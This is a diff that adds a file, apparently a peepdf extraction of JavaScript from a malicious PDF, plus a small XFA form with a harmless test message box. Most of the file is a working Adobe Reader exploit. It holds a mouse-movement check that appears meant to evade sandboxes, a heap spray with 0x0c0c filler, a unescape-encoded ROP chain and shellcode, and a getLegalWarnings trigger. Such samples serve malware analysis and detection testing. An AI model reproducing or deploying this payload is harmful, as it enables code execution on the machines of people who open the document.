@@ -1,0 +1,30 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+{
+    var x = this.mouseX;
+    var y = this.mouseY;
+    while (x == this.mouseX || y == this.mouseY); {
+
+        // comment
+        var shellcode = unescape("%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u56be%u2f5a%udbec%ud9c7%u2474%u58f4%uc929%u5db1%ue883%u31fc%u0f70%u7003%ub859%u10da%ube8d%ue925%udf4d%u0cac%udf7c%u45cb%uef2e%u0898%u84c2%ub8cd%ue851%ucfd9%u47d2%ue13c%uf4e3%u607c%u0767%u4251%uc856%u83a4%u359f%ud144%u3148%uc6fb%u0ffd%u6dc0%u814d%u9140%ua005%u0461%ufb1e%ua6a1%u77f3%ub0e8%ubd10%u4ba2%u49e2%u9a35%ub13b%ue39a%u40f4%u24e2%ubb32%u5c91%u4641%u9aa2%u9c38%u3927%u579a%ue59f%ubb1b%u6d46%u7017%u290c%u873b%u41c1%u0c47%u85e4%u56ce%u01c3%u0d8b%u136a%ue371%u4393%u5cda%u0f36%u89f6%u524b%u7e9e%u6d66%ue95e%u1ef1%ub66c%u88a9%u3fdc%u4e74%u6a23%uc0c0%u95da%uc831%uc118%u6261%u6a89%u72ea%ubf36%u22bd%u1098%u937e%uc158%uf916%u3e57%u0206%u57b2%ue42f%u583c%u73b0%u3459%u18d9%uabc8%uac6c%u517c%u33e8%uf0ee%uc785%u2c8f%u491a%u453d%u89a3%u0ca9%ube7b%ub0a9%u35a9%u52e9%u4038%u02b9%u54be%u8339%ub237%u3353%u6c1e%uaacb%ue63b%u326a%u8296%ub8ac%u7213%u4962%u6051%u2892%u7899%uc162%u1299%u4366%u8acd%ub264%u1539%u9197%u5239%u6467%u2808%uf251%u4634%u129d%u96b5%u78cb%ufeb5%ud8ab%u1be6%uf4b4%ub79a%uf720%u64ca%u9fe3%u53f0%u3fc3%ub60a%u4750%u44f4%ue074%ub69d%u1038%udd5e%u40b8%u2a36%u6f97%ud3f6%u3832%u5e9e%u8ad2%u5e3f%u4bff%u5f9e%u57f3%ufbf7%u67f4%ufdf8%ub1c9%u8bc1%u020a%u8376%u2721%u0edf%u7b49%u1b1f");
+        var c = unescape("%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c");
+        while (c.length + 20 + 8 < 0x10000) c += c;
+        b = c.substring(0, (0x0c0c - 0x24) / 2);
+        b += shellcode;
+        b += c;
+        d = b.substring(0, 0x10000 / 2);
+        while (d.length < 0x80000) d += d;
+        var_3 = d.substring(0, 0x80000 - (0x1020 - 0x08) / 2);
+        var var_4 = new Array();
+        for (i = 0; i < 0x1f0; i++) var_4[i] = var_3 + "s";
+        this.getLegalWarnings(true);
+    }
+}
+
+// peepdf comment: Javascript code located in object 9 (version 0)
+
+<? xml version = '1.0' ?> < xdp: xdp xmlns: xdp = 'http://ns.adobe.com/xdp/' > < config xmlns: xfa = 'http://www.xfa.org/schema/xci/3.0/' > < present > < pdf > < interactive > 1 < /interactive></pdf > < /present></config > < template xmlns: xfa = 'http://www.xfa.org/schema/xfa-template/3.0/' > < subform layout = 'tb'
+name = 'form1' > < pageSet / > < event activity = 'initialize'
+name = 'event__ready' > < script contentType = 'application/x-formcalc' > < /script></event > < subform > < field name = 'Button1' > < ui > < button highlight = 'inverted' / > < /ui><caption><value><text>Send!</text > < /value><para hAlign='center' vAlign='middle'/ > < /caption><bind match='none'/ > < event activity = 'click'
+name = 'event__click' > < script contentType = 'application/x-formcalc' > < /script></event > < /field><field name='TextField1'><ui><textEdit><border><edge stroke='lowered'/ > < /border></textEdit > < /ui></field > < /subform></subform > < /template><xfa:datasets xmlns:xfa='http:/ / www.xfa.org / schema / xfa - data / 1.0 / '><xfa:data><form1><TextField1>$host.messageBox("Greetings from Mars!")</TextField1></form1></xfa:data></xfa:datasets></xdp:xdp>
+
